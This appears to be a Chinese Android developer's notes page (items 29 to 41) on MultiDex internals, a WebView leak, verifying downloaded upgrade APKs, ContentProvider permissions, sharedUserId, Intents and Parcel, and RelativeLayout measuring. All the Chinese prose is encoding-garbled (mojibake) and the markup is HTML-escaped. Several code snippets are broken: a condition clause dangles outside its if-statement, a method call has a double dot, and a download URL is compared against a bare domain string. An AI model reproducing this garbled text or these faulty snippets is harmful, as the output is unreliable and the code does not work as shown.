·æ˜¯è°ƒç”¨çš„childçš„drawingCacheEnabledRomain Guyçš„åšå®¢æåˆ°äº†ListViewé»˜è®¤å¼€å¯ï¼Œä½†ä»–å¿˜è®°äº†GridViewé»˜è®¤å¼€å¯ 29.å…³äº65536é—®é¢˜Too many classes in â€“main-dex-list, main dex capacity exceeded | ä¸»Dexå¼•ç”¨å¤ªå¤šæ€ä¹ˆåŠï¼ŸMultiDexå¯¹äºminSdk&gt; =21 ä¸ä¼šç”Ÿæ•ˆï¼Œå¦‚æœæœ€ä½ç‰ˆæœ¬æ˜¯21ä¸Šé¢æ‰€æœ‰çš„ä»»åŠ¡éƒ½ä¸ä¼šæ‰§è¡Œï¼Œä¹Ÿä¸ä¼šæœ‰ä¸»Dexåˆ—è¡¨çš„è®¡ç®—ã€‚è¿™æ˜¯å› ä¸ºåœ¨åº”ç”¨å®‰è£…æœŸé—´æ‰€æœ‰çš„dexæ–‡ä»¶éƒ½ä¼šè¢«ARTè½¬æ¢ä¸ºä¸€ä¸ª.oatæ–‡ä»¶ã€‚æ‰€ä»¥minSdké«˜çš„ä¹Ÿä¸ç”¨å¼€multiDexäº†ã€‚åœ¨ä½¿ç”¨ARTè™šæ‹Ÿæœºçš„è®¾å¤‡ä¸Š(éƒ¨åˆ†4.4è®¾å¤‡ï¼Œ5.0+ä»¥ä¸Šéƒ½é»˜è®¤ARTç¯å¢ƒ)ï¼Œå·²ç»åŸç”Ÿæ”¯æŒå¤šDexï¼Œå› æ­¤å°±ä¸éœ€è¦æ‰‹åŠ¨æ”¯æŒäº† Android 5.0 (API level 21) and higher uses a runtime called ART which natively supports loading multiple DEX files from APK files. ART performs pre-compilation at app install time which scans for classesN.dex files and compiles them into a single .oat file for execution by the Android device. Therefore, if your minSdkVersion is 21 or higher, you do not need the multidex support library. çœ‹ä¸‹MultiDexçš„æºç ï¼ŒsecondaryDexæ–‡ä»¶çš„è·¯å¾„æ˜¯/date/date/&lt;package_name&gt;/code_cache/secondary-dexes/ è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹MultiDexçš„åŸç†åŸºæœ¬ä¸Šåœ¨ç®€ä¹¦ private static final class V14 { private static void install(final ClassLoader loader, final List&lt;File&gt; additionalClassPathEntries, final File optimizedDirectory) throws IllegalArgumentException, IllegalAccessException, NoSuchFieldException, InvocationTargetException, NoSuchMethodException { //é€šè¿‡åå°„è·å–loaderçš„pathListå­—æ®µï¼Œloaderæ˜¯ç”±Application.getClassLoader()è·å–çš„ï¼Œå®é™…è·å–åˆ°çš„æ˜¯PathClassLoaderå¯¹è±¡çš„pathListå­—æ®µ final Field pathListField = findField(loader, &quot;pathList&quot;); final Object dexPathList = pathListField.get(loader); //dexPathListæ˜¯PathClassLoaderçš„ç§æœ‰å­—æ®µï¼Œé‡Œé¢ä¿å­˜çš„æ˜¯Main Dexä¸­çš„class //dexElementsæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢çš„æ¯ä¸€ä¸ªitemå°±æ˜¯ä¸€ä¸ªDexæ–‡ä»¶ //makeDexElements()è¿”å›çš„æ˜¯å…¶ä»–Dexæ–‡ä»¶ä¸­è·å–åˆ°çš„Elements[]å¯¹è±¡ï¼Œå†…éƒ¨é€šè¿‡åå°„makeDexElements()è·å– //expandFieldArrayæ˜¯ä¸ºäº†æŠŠmakeDexElements()è¿”å›çš„Elements[]å¯¹è±¡æ·»åŠ åˆ°dexPathListå­—æ®µçš„æˆå‘˜å˜é‡dexElementsä¸­ expandFieldArray(dexPathList, &quot;dexElements&quot;, makeDexElements(dexPathList, new ArrayList&lt;File&gt;(additionalClassPathEntries), optimizedDirectory)); } private static Object[] makeDexElements(final Object dexPathList, final ArrayList&lt;File&gt; files, final File optimizedDirectory) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException { final Method makeDexElements = findMethod(dexPathList, &quot;makeDexElements&quot;, (Class&lt;?&gt;[])new Class[] { ArrayList.class, File.class }); return (Object[])makeDexElements.invoke(dexPathList, files, optimizedDirectory); } } è¿™é‡Œé¢æ³¨æ„makeDexElementsæ–¹æ³•ï¼Œæ˜¯é€šè¿‡åå°„è°ƒç”¨äº†Dalvikçš„DexPathList classçš„è¿™ä¸ªæ–¹æ³•makeDexElementsã€‚è¯´ç™½äº†ï¼Œæ•´ä¸ªè¿‡ç¨‹å°±æ˜¯åœ¨/data/data/(packagename)/code_cache/è¿™ä¸ªç›®å½•ä¸‹é¢å¤åˆ¶ç²˜è´´æ–‡ä»¶(class.dexæ–‡ä»¶ä¹Ÿæ˜¯æ–‡ä»¶)ï¼Œå¤åˆ¶ç²˜è´´æ–‡ä»¶å¸¦æ¥çš„å½±å“å°±æ˜¯classLoader(Androidä¸Šæ˜¯BaseDexClassLoader)åœ¨findClassçš„æ—¶å€™è°ƒç”¨çš„æ˜¯DexPathListçš„findClassæ–¹æ³•: public Class findClass(String name) { for (Element element : dexElements) { DexFile dex = element.dexFile; if (dex != null) { Class clazz = dex.loadClassBinaryName(name, definingContext); if (clazz != null) { return clazz; } } } return null; } å½“ç„¶ï¼ŒTinkerä¹Ÿæ˜¯é‡‡ç”¨çš„æå…¶ç›¸ä¼¼çš„æ–¹æ³•ï¼Œå®Œæˆäº†dexæ›¿æ¢(è°åœ¨è¿™ä¸ªæ•°ç»„å‰é¢è°å°±å…ˆå¾—åˆ°åŠ è½½)å‡¯å­å“¥æåˆ°ç”±äºåœ¨Appå†·å¯åŠ¨çš„æ—¶å€™ç”±äºåå°„å¤–åŠ ioæ“ä½œï¼Œå¯èƒ½ä¼šæ¯”è¾ƒå¡ç”šè‡³ANR,æŠŠè¿™éƒ¨åˆ†æ“ä½œå¼„åˆ°å­çº¿ç¨‹ä¹Ÿæ˜¯è¡Œçš„ï¼Œä¸€ç§å¯èƒ½çš„æ–¹æ¡ˆæ˜¯ä»Instrumentationä¸‹æ‰‹ã€‚ 30 . ä»å·²å®‰è£…çš„appä¸­æå–apké¸¿æ´‹çš„åšå®¢ä¸­æåˆ°è¿‡å¦‚ä½•ä½¿ç”¨bsdiffæ¯”è¾ƒæ—§çš„apkå’Œæ–°çš„apkçš„å·®å¼‚ context = context.getApplicationContext(); ApplicationInfo applicationInfo = context.getApplicationInfo(); String apkPath = applicationInfo.sourceDir; return apkPath; åœ¨Android Studio 3.0åï¼Œç›´æ¥åœ¨Device Explorerä¸­æŸ¥çœ‹data/app/com.example.appnameï¼Œå‘ç°é‡Œé¢æœ‰ä¸ªbase.apkæ–‡ä»¶ã€‚å‡ ä¹å°±æ˜¯æŠŠåŸæœ‰çš„apkæ–‡ä»¶å¤åˆ¶äº†ä¸€ä»½ã€‚ 31. è€ç‰ˆæœ¬çš„WebViewæ˜¯å­˜åœ¨å†…å­˜æ³„éœ²çš„å‚è€ƒå¤§è‡´ä¸Šå°±æ˜¯ä¸»åŠ¨è°ƒç”¨äº†WebView.destoryæ–¹æ³•ï¼ŒåŸæœ¬åœ¨onDetachedFromWindowä¸­ç³»ç»Ÿçš„ä¸€äº›èµ„æºé‡Šæ”¾å°±æ²¡æœ‰èµ°åˆ°ï¼Œä½œè€…ç»™å‡ºäº†è¿™æ ·çš„è§£å†³æ–¹æ¡ˆ ViewParent parent = mWebView.getParent(); if (parent != null) { ((ViewGroup) parent).removeView(mWebView);// è¿™é‡Œé¢ä¼šè°ƒç”¨åˆ° view.dispatchDetachedFromWindow(); } mWebView.destroy(); webViewçš„sourceCode 32. Appå‡çº§æˆ–è€…å®‰è£…ä¹‹å‰æ˜¯è¦åšä¸€äº›æ£€æŸ¥çš„è¿™ç¯‡æ–‡ç« è¯¦å°½æè¿°äº†éœ€è¦åšçš„ä¸€äº›æ–¹æ¡ˆå¯èƒ½è¢«åŠ«æŒçš„åœ°æ–¹æœ‰ä¸‰å¤„ï¼š å‡çº§api(å°±æ˜¯è¿”å›ä¸‹è½½é“¾æ¥çš„æ¥å£)ï¼Œä¸‹è½½api(å°±æ˜¯é‚£ä¸ªcdn), å®‰è£…è¿‡ç¨‹(è°ƒç”¨packageManagerä¹‹å‰) å‡çº§æ¥å£å¿…é¡»httpsï¼Œé¿å…è¿”å›æ¶æ„åœ°å€ æ£€æŸ¥fileçš„md5å’ŒæœåŠ¡å™¨responseä¸­çš„md5æ˜¯å¦ä¸€è‡´ è¿˜è¦å¯¹ä¸‹è½½çš„æ–‡ä»¶è¿›è¡ŒåŒ…åå’Œç­¾åéªŒè¯ï¼Œé˜²æ­¢Apkè¢«æ¶æ„æ¤å…¥æœ¨é©¬ // å‡çº§æ¥å£è¿”å›ä¸‹è½½åœ°å€ä¹‹å UpgradeModel aResult = xxxx;//è§£ææœåŠ¡å™¨è¿”å›çš„åæ•°æ® if (aResult != null &amp;&amp; aResult.getData() != null ) { String url = aResult.getData().getDownUrl(); if (url == null || !TextUtils.equals(url, &quot;the_domain_that_i_own&quot;)) { // å¦‚æœä¸æ˜¯è‡ªå·±æŒæ¡çš„åŸŸåï¼Œä¸ä¸‹è½½ } } // åˆ¤æ–­ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶çš„md5å’Œå‡çº§æ¥å£æè¿°çš„md5æ˜¯å¦ä¸€è‡´ File file = DownUtils.getFile(url); // ç›‘æµ‹æ˜¯å¦è¦é‡æ–°ä¸‹è½½ if (file.exists() &amp;&amp; TextUtils.equals(aResult.getData().getHashCode(), EncryptUtils.Md5File(file))) { &amp;&amp; TextUtils.equals(aResult.getData().getKey(), DownLoadModel.getData()..getKey()) // å¦‚æœç¬¦åˆï¼Œå°±å»å®‰è£… ä¸ç¬¦åˆé‡æ–°ä¸‹è½½ åˆ é™¤æ¶æ„æ–‡ä»¶ } // ä¸‹é¢è¿™äº›ä»£ç æ¥è‡ªä¸Šè¿°æ–‡ç«  public static void installApK(Context context, final String path, final String name ) { if (!SafetyUtils.checkFile(path + name, context)) { return; } if (!SafetyUtils.checkPagakgeName(context, path + name)) { Toast.makeText(context, &quot;å‡çº§åŒ…è¢«æ¶æ„è½¯ä»¶ç¯¡æ”¹ è¯·é‡æ–°å‡çº§ä¸‹è½½å®‰è£…&quot;, Toast.LENGTH_SHORT ).show(); DLUtils.deleteFile(path + name); ((Activity)context).finish(); return; } switch (SafetyUtils.checkPagakgeSign(context, path + name)) { case SafetyUtils.SUCCESS: DLUtils.openFile(path + name, context); break; case SafetyUtils.SIGNATURES_INVALIDATE: Toast.makeText(context, &quot;å‡çº§åŒ…å®‰å…¨æ ¡éªŒå¤±è´¥ è¯·é‡æ–°å‡çº§&quot;, Toast.LENGTH_SHORT ).show(); ((Activity)context).finish(); break; case SafetyUtils.VERIFY_SIGNATURES_FAIL: Toast.makeText(context, &quot;å‡çº§åŒ…ä¸ºç›—ç‰ˆåº”ç”¨ è¯·é‡æ–°å‡çº§&quot;, Toast.LENGTH_SHORT ).show(); ((Activity)context).finish(); break; default: break; } } /** * å®‰å…¨æ ¡éªŒ * Created by LIUYONGKUI on 2016-04-21. */ public class SafetyUtils { /** install sucess */ protected static final int SUCCESS = 0; /** SIGNATURES_INVALIDATE */ protected static final int SIGNATURES_INVALIDATE = 3; /** SIGNATURES_NOT_SAME */ protected static final int VERIFY_SIGNATURES_FAIL = 4; /** is needcheck */ private static final boolean NEED_VERIFY_CERT = true; /** * checkPagakgeSigns. */ public static int checkPagakgeSign(Context context, String srcPluginFile) { PackageInfo PackageInfo = context.getPackageManager().getPackageArchiveInfo(srcPluginFile, 0); //Signature[] pluginSignatures = PackageInfo.signatures; Signature[] pluginSignatures = PackageParser.collectCertificates(srcPluginFile, false); boolean isDebugable = (0 != (context.getApplicationInfo().flags &amp; ApplicationInfo.FLAG_DEBUGGABLE)); if (pluginSignatures == null) { PaLog.e(&quot;ç­¾åéªŒè¯å¤±è´¥&quot;, srcPluginFile); new File(srcPluginFile).delete(); return SIGNATURES_INVALIDATE; } else if (NEED_VERIFY_CERT &amp;&amp; !isDebugable) { //å¯é€‰æ­¥éª¤ï¼ŒéªŒè¯APKè¯ä¹¦æ˜¯å¦å’Œç°åœ¨ç¨‹åºè¯ä¹¦ç›¸åŒã€‚ Signature[] mainSignatures = null; try { PackageInfo pkgInfo = context.getPackageManager().getPackageInfo( context.getPackageName(), PackageManager.GET_SIGNATURES); mainSignatures = pkgInfo.signatures; } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } if (!PackageParser.isSignaturesSame(mainSignatures, pluginSignatures)) { PaLog.e(&quot;å‡çº§åŒ…è¯ä¹¦å’Œæ—§ç‰ˆæœ¬è¯ä¹¦ä¸ä¸€è‡´&quot;, srcPluginFile); new File(srcPluginFile).delete(); return VERIFY_SIGNATURES_FAIL; } } return SUCCESS; } /** * checkPagakgeName * @param context * @param srcNewFile * @return */ public static boolean checkPagakgeName (Context context, String srcNewFile) { PackageInfo packageInfo = context.getPackageManager().getPackageArchiveInfo(srcNewFile, PackageManager.GET_ACTIVITIES); if (packageInfo != null) { return TextUtils.equals(context.getPackageName(), packageInfo.packageName); } return false; } /** * checkFile * * @param aPath * æ–‡ä»¶è·¯å¾„ * @param context * context */ public static boolean checkFile(String aPath, Context context) { File aFile = new File(aPath); if (aFile == null || !aFile.exists()) { Toast.makeText(context, &quot;å®‰è£…åŒ…å·²è¢«æ¶æ„è½¯ä»¶åˆ é™¤&quot;, Toast.LENGTH_SHORT).show(); return false; } if (context == null) { Toast.makeText(context, &quot;å®‰è£…åŒ…å¼‚å¸¸&quot;, Toast.LENGTH_SHORT).show(); return false; } return true; } } 33. TextViewåŸç”Ÿæ”¯æŒä¸€äº›æ¯”è¾ƒå¥½ç©çš„å±æ€§Advanced Android TextViewæ¯”æ–¹è¯´ Bitmap bitmap = BitmapFactory. decodeResource(getResource(),R.drawable_cheetah_title); Shader shader = new BitmapShader( bitmap, Shader.TileMode.REPEAT, Shader.TileMode.REPEAT); textView.getPaint().setShader(shader); ) TextViewæ¸²æŸ“htmlæ–‡æ¡£çš„æ—¶å€™å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªtagHandleræ˜¾ç¤ºæ•°å­¦ä¸Šçš„å¸¦æœ‰åˆ†å­å’Œåˆ†æ¯çš„åˆ†æ•°ï¼Œå¯ä»¥ä½¿ç”¨æ ‡ç­¾TextViewé‡Œé¢æœ‰ä¸€ä¸ªLayout.Alignmentçš„å±æ€§ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªAlignMentSpanï¼Œå¯ä»¥ç”¨æ¥å®ç°ç±»ä¼¼äºèŠå¤©çš„æ–‡å­—å·¦å¯¹é½ï¼Œå³å¯¹é½ï¼Œåªç”¨ä¸€ä¸ªTextView 34. ContentProviderçš„ä¸€äº›ç‚¹å¯ä»¥è‡ªå®šä¹‰æƒé™ï¼Œåœ¨manifesté‡Œé¢å†™URIæœ‰å›ºå®šæ ¼å¼ï¼š åˆ†æURIï¼šcontent://com.ljq.provider.personprovider/person/10/nameï¼Œå…¶ä¸­content://æ˜¯Schemeï¼Œcom.ljq.provider.personproviderè¡¨ç¤ºä¸»æœºåæˆ–è€…authoritiesï¼Œperson/10/nameè¡¨ç¤ºè·¯å¾„ï¼Œæ­¤URIè¦æ“ä½œpersonè¡¨ä¸­idä¸º10çš„nameå­—æ®µã€‚ è‡ªå®šä¹‰æƒé™ &lt;permission android:name=&quot;me.pengtao.READ&quot; android:protectionLevel=&quot;normal&quot;/&gt; &lt;provider android:authorities=&quot;me.pengtao.contentprovidertest&quot; android:name=&quot;.provider.TestProvider&quot; android:readPermission=&quot;me.pengtao.READ&quot; android:exported=&quot;true&quot;&gt; &lt;/provider&gt; &lt;!-- åœ¨ç¬¬ä¸‰æ–¹appä¸­å°±å¯ä»¥å£°æ˜ï¼š --&gt; &lt;uses-permission android:name=&quot;me.pengtao.READ&quot;/&gt; å¦å¤–è¯´ä¸€å¥ï¼ŒContentProvideræ˜¯åœ¨Appå¯åŠ¨çš„æ—¶å€™å°±åˆ›å»ºçš„ï¼Œæ¯”Applicationçš„onCreateè¿˜è¦æ—© 35. android:multiprocess=â€trueâ€Activityå¯ä»¥åœ¨Manifestä¸­å£°æ˜è¿™ä¸ªå±æ€§ï¼Œproviderä¹Ÿå¯ä»¥å£°æ˜è¿™ä¸ªå±æ€§ã€‚è¿™ä¸ªæ„æ€å°±æ˜¯è¯´ï¼Œè¿™ä¸ªactivityæˆ–è€…provideråœ¨Aè¿›ç¨‹è¢«æ‹‰èµ·ï¼Œé‚£å°±åˆ›å»ºä¸€ä¸ªAè¿›ç¨‹çš„Activityå®ä¾‹ã€‚åœ¨Bè¿›ç¨‹è¢«æ‹‰èµ·ï¼Œå°±åˆ›å»ºä¸€ä¸ªBè¿›ç¨‹çš„Activityå®ä¾‹ã€‚åœ¨é‚£ä¸ªè¿›ç¨‹è¢«æ‰“å¼€å°±åˆ›å»ºä¸€ä¸ªè·‘åœ¨å“ªä¸ªè¿›ç¨‹çš„å®ä¾‹ If the app runs in multiple processes, this attribute determines whether multiple instances of the content provder are created. If true, each of the appâ€™s processes has its own content provider object. If false, the appâ€™s processes share only one content provider object. The default value is false.Setting this flag to true may improve performance by reducing the overhead of interprocess communication, but it also increases the memory footprint of each process. 36. ä¸¤ä¸ªAppä¹‹é—´å…±äº«æ•°æ® ä¸¤ä¸ªåº”ç”¨çš„ShareUserIdç›¸åŒï¼Œåˆ™å…±äº«å¯¹æ–¹çš„dataç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬SharePreference, file, libç­‰æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œåœ¨ShareUserIdç›¸åŒçš„æƒ…å†µä¸‹ï¼Œè¯»å–å¦ä¸€ä¸ªåº”ç”¨çš„SharePreferenceæ–‡ä»¶ã€‚ //ç¬¬ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸ºçš„menifestæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š &lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.mythou.serviceID&quot; android:sharedUserId=&quot;com.mythou.share&quot; &gt; //ç¬¬äºŒä¸ªåº”ç”¨ç¨‹åºçš„menifestæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š &lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.mythou.clientID&quot; android:sharedUserId=&quot;com.mythou.share&quot; &gt; è¯»å–çš„æ—¶å€™è¿™ä¹ˆè¯» try { Context ct=this.createPackageContext (&quot;com.mythou.serviceID&quot;, Context.CONTEXT_IGNORE_SECURITY); SharedPreferences sp = ct.getSharedPreferences(&quot;appInfo&quot;, MODE_PRIVATE); String str2 = sp.getString(&quot;appname&quot;, &quot;service&quot;); Log.d(&quot;test&quot;, &quot;share preference--&gt;&quot; + str2); } catch (NameNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } 37. ActivityAliaså°±è·ŸAliasä¸€æ ·&lt;activity android:name=&quot;com.mytest.StartupActivity&quot; android:exported=&quot;true&quot;&gt; &lt;/activity&gt; &lt;!-- Solution for upgrading issue --&gt; &lt;activity-alias android:name=&quot;com.mytest.HomeActivity&quot; android:targetActivity=&quot;com.mytest.StartupActivity&quot; android:exported=&quot;true&quot; android:enabled=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt; &lt;/activity-alias&gt; 38. è‡ªå®šä¹‰ä¸€ä¸ªschemeä¹Ÿå¾ˆç®€å•æ¯”å¦‚è¯´Appæ‰“ç”µè¯å°±æ˜¯: //ç”µè¯å·ç  String phoneNum = phoneNumEdit.getText().toString().trim(); //æ‰“ç”µè¯ Intent callIntent = new Intent(Intent.ACTION_CALL); callIntent.setData(Uri.parse(&quot;tel:&quot;+phoneNum)); startActivity(callIntent); Intent takePhotoIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE); startActivityForResult(takePhotoIntent, REQUEST_TAKE_PHOTO); // ç³»ç»Ÿç›¸æœºè¿›ç¨‹çš„æ•°æ®è¿˜èƒ½é€šè¿‡onActivityResultè¿”å›ï¼Œè·¨è¿›ç¨‹äº† @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { //å¦‚æœå»æ‹ç…§è¯·æ±‚è¿”å› if (requestCode == REQUEST_TAKE_PHOTO) { //å¦‚æœç»“æœè¿”å›æˆåŠŸ if (resultCode == RESULT_OK) { Bitmap bmp = (Bitmap) data.getExtras().get(&quot;data&quot;); takeResultImg.setImageBitmap(bmp); } } super.onActivityResult(requestCode, resultCode, data); } &lt;activity android:name=&quot;com.sarnasea.interprocess.ShareActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.sarnasea.interprocess.MYACTION&quot;/&gt; &lt;data android:scheme=&quot;message&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; // åœ¨ShareActivityè·å¾—å…¶ä»–åº”ç”¨ç¨‹åºä¼ é€’è¿‡æ¥çš„æ•°æ® ï¼ˆå®Œå…¨å¯ä»¥å¤šè¿›ç¨‹ï¼‰ Uri data = getIntent().getData(); if (data != null) { //è·å¾—Host,ä¹Ÿå°±æ˜¯message://åé¢çš„ä¸»ä½“å†…å®¹ String host = data.getHost(); Toast.makeText(this, host, Toast.LENGTH_SHORT).show(); } Bundle bundle = getIntent().getExtras(); if(bundle != null){ //è·å¾—å…¶ä»–åº”ç”¨ç¨‹åºè°ƒç”¨è¯¥Activityæ—¶ä¼ é€’è¿‡æ¥çš„Extrasæ•°æ® String value = bundle.getString(&quot;value&quot;); Toast.makeText(this, value, Toast.LENGTH_SHORT).show(); } // å¤–éƒ¨å¯åŠ¨è¿™ä¸ªActivityçš„æ–¹æ³• Intent intent = new Intent(); intent.setAction(&quot;com.sarnasea.interprocess.MYACTION&quot;); intent.setData(Uri.parse(&quot;message://Hello World!&quot;)); intent.putExtra(&quot;value&quot;, &quot;yanglu&quot;); startActivity(intent); //è¿™ä¸ªActivtyè¿˜å¯ä»¥ä»å¦ä¸€ä¸ªè¿›ç¨‹è¿”å›æ•°æ® Intent data = new Intent(); // è®¾ç½®è¦è¿”å›çš„æ•°æ® data.putExtra(&quot;result&quot;, &quot;å…³é—­Activityæ—¶è¿”å›çš„æ•°æ®&quot;); // è®¾ç½®è¿”å›ç å’ŒIntentå¯¹è±¡ setResult(Activity.RESULT_OK, data); // å…³é—­Activity finish(); 39. Intentçš„åº•å±‚å®ç°æ˜¯å…±äº«å†…å­˜ä¸¤ä¸ªActivityä¹‹é—´Intentä¼ é€’æ•°æ®çš„æ—¶å€™ï¼ŒIntentä¸­çš„æ•°æ®å·²ç»ç»å†äº†ä¸¤è½®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå½“ç„¶æ˜¯ä¸åŒçš„å¯¹è±¡ç†Ÿæ‚‰AIDLçš„åŒå­¦éƒ½å¾ˆæ¸…æ¥šï¼ŒAIDLè·¨è¿›ç¨‹é€šä¿¡æ”¯æŒçš„æ•°æ®ç±»å‹æ˜¯ï¼š Java çš„åŸç”Ÿç±»å‹ï¼Œå¦‚int,boolean,long,floatâ€¦String å’ŒCharSequenceList å’Œ Map ,Listå’ŒMap å¯¹è±¡çš„å…ƒç´ å¿…é¡»æ˜¯AIDLæ”¯æŒçš„æ•°æ®ç±»å‹AIDL è‡ªåŠ¨ç”Ÿæˆçš„æ¥å£ éœ€è¦å¯¼å…¥(import)å®ç°android.os.Parcelable æ¥å£çš„ç±». éœ€è¦å¯¼å…¥(import)ã€‚è¿™é‡Œå¹¶ä¸åŒ…æ‹¬Serializableç±»å‹ã€‚äºæ˜¯å»çœ‹äº†æºç ï¼Œå‘ç°æ˜¯Parcelè‡ªå·±å¯¹Serializableç±»å‹çš„å¯¹è±¡åšäº†å…¼å®¹ï¼Œå¯ä»¥ç›´æ¥å†™å…¥å…¶ä¸­ã€‚public class Intent implements Parcelable, Cloneable Intentä¼ é€’æ•°æ®åº•å±‚åˆ†æ Parcelableæ˜¯Androidä¸ºæˆ‘ä»¬æä¾›çš„åºåˆ—åŒ–çš„æ¥å£,Parcelableç›¸å¯¹äºSerializableçš„ä½¿ç”¨ç›¸å¯¹å¤æ‚ä¸€äº›,ä½†Parcelableçš„æ•ˆç‡ç›¸å¯¹Serializableä¹Ÿé«˜å¾ˆå¤š,è¿™ä¸€ç›´æ˜¯Googleå·¥ç¨‹å¸ˆå¼•ä»¥ä¸ºå‚²çš„,æœ‰æ—¶é—´çš„å¯ä»¥çœ‹ä¸€ä¸‹Parcelableå’ŒSerializableçš„æ•ˆç‡å¯¹æ¯” Parcelable vs Serializable å·ç§°å¿«10å€çš„æ•ˆç‡ Parcelableçš„åº•å±‚ä½¿ç”¨äº† Parcel æœºåˆ¶ï¼Œ Parcelæœºåˆ¶ä¼šå°†åºåˆ—åŒ–çš„æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªå…±äº«å†…å­˜ä¸­ï¼Œå…¶ä»–è¿›ç¨‹é€šè¿‡Parcelä»å…±äº«å†…å­˜ä¸­è¯»å‡ºå­—èŠ‚æµï¼Œç„¶åååºåˆ—åŒ–åä½¿ç”¨ã€‚è¿™å°±æ˜¯Intentæˆ–Bundleèƒ½å¤Ÿåœ¨activityæˆ–è€…åœ¨binderä¸­è·¨è¿›ç¨‹é€šä¿¡çš„åŸç†ã€‚ 40. BlockCanaryçš„åŸç†å°±æ˜¯åœ¨æ¯ä¸€ä¸ªMessageæ‰§è¡Œå‰è®¡æ—¶ï¼Œç»“æŸååœæ­¢è®¡æ—¶ï¼Œçœ‹ä¸‹æ—¶é—´æœ‰æ²¡æœ‰è¶…è¿‡é˜ˆå€¼ã€‚BlockCanaryå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œé¢è€ƒè™‘åˆ°äº†ç³»ç»Ÿç»™å½“å‰è¿›ç¨‹åˆ†é…çš„CPUæ—¶é—´æ®µå…·ä½“å°±æ˜¯ cat /proc/pid/stat ## å¦‚æœç³»ç»Ÿåˆ†é…çš„cpuæ—¶é—´ä¸å¤Ÿï¼Œé‚£ä¹ˆå¡é¡¿ä¹Ÿæ˜¯éš¾å…çš„ 41. RelativeLayoutçš„å±…ä¸­centerVertical = true å¹¶ä¸æ˜¯æˆ‘æ‰€æƒ³è±¡çš„é‚£æ ·ã€‚äº²æµ‹ï¼Œä¾‹å¦‚ä¸€ä¸ªRelativeLayoutçš„é«˜åº¦å†™æ­»100dpï¼Œæ‰€æœ‰çš„childéƒ½æ˜¯centerVertical = true ï¼Œchildçš„é«˜åº¦éƒ½æ˜¯50dpã€‚è¿è¡Œæ—¶ä¿®æ”¹RelativeLayoutçš„layoutParmas.height = 130dp ï¼ŒåŒæ—¶relativeLayout.paddingTop = 30dpã€‚é‚£ä¹ˆæœ€ç»ˆçš„ç»“æœå¹¶ä¸æ˜¯æˆ‘æ‰€æƒ³è±¡çš„ï¼Œæ¯ä¸€ä¸ªchildçš„top= 55dpï¼Œå®é™…ç»“æœæ˜¯æ¯ä¸€ä¸ªchildçš„top = 40dp (æ˜¯çš„,centerVerticalå°†paddingä¹Ÿç®—è¿›æ¥äº†)å¦å¤–ï¼Œ100dpé«˜çš„parent,parent.paddingTop= 25dp, parent.paddindBottom = 25dpã€‚é‡Œå¤´æ”¾ä¸€ä¸ª60dpçš„childï¼ˆchildçš„marginTop = 10dp,marginBottom= 10dpï¼‰ï¼Œæœ€ç»ˆçš„æ•ˆæœæ˜¯childçš„é«˜åº¦è¢«å‹æˆ30dp(100 - 25-25-10 -10)ã€‚è¿™äº›åœ¨onMeasureçš„æºç é‡Œé¢éƒ½èƒ½çœ‹åˆ° RelativeLayoutçš„æºç ä¸­ä½¿ç”¨äº†æ‹“æ‰‘æ’åºçš„æ–¹å¼ï¼Œåœ¨onMeasureä¸­é¢„å…ˆç†æ¸…æ¥šå„ä¸ªchildä¹‹é—´çš„ä¾èµ–æ ‘ï¼ˆå­˜å‚¨åœ¨dependencyGraphä¸­ï¼‰ï¼Œå…·ä½“çš„measureä¸­æ ¹æ®ç†æ¸…æ¥šçš„ä¾èµ–ç»™é‚£äº›ä¸ä¾èµ–å…¶ä»–çš„viewé¢„å…ˆæ’å¥½åº§æ¬¡ï¼Œé‚£äº›éœ€è¦ä¾èµ–å…¶ä»–viewçš„ä½ç½®ä¿¡æ¯çš„viewï¼Œä¼šæ‰¾åˆ°å¯¹åº”çš„åœ¨å„ä¸ªæ–¹å‘ä¸Šçš„anchorParams(é”šç‚¹)ï¼Œç¡®å®šå…¶åœ¨è¯¥æ–¹å‘ä¸Šçš„åæ ‡ï¼ˆapplyHorizontalSizeRulesï¼‰ã€‚applyäº†è¿™äº›constraintä¹‹åï¼Œæ ¹æ®RelativeLayoutè‡ªèº«çš„widthå’Œheightç»™childè®¡ç®—å‡ºä¸€ä¸ªmeasureSpec(ä»¥å®½åº¦ä¸ºä¾‹ï¼Œåˆ†ç»™childçš„maxAvailableæ˜¯è‡ªèº«çš„å®½åº¦å‡æ‰è‡ªèº«å·¦å³paddingï¼Œå‡æ‰childçš„marginLeftå’ŒmarginRight,modeæ–¹é¢ï¼Œä¸€èˆ¬ç»™childåˆ†é…çš„éƒ½æ˜¯MeasureSpec.EXACTLY(childå†™äº†ä¸ªmatch_parent)æˆ–è€…MeasureSpec.AT_MOST(childå†™äº†ä¸ªwrap_content)),è·Ÿç€æ˜¯positionChildHorizontal(æ ¹æ®å‰è¿°çš„æ”¶é›†çš„ä¿¡æ¯ï¼Œè¡¥å…¨ä¸€äº›mleftå’ŒmRight)ã€‚ RelativeLayoutçš„ä»£ç 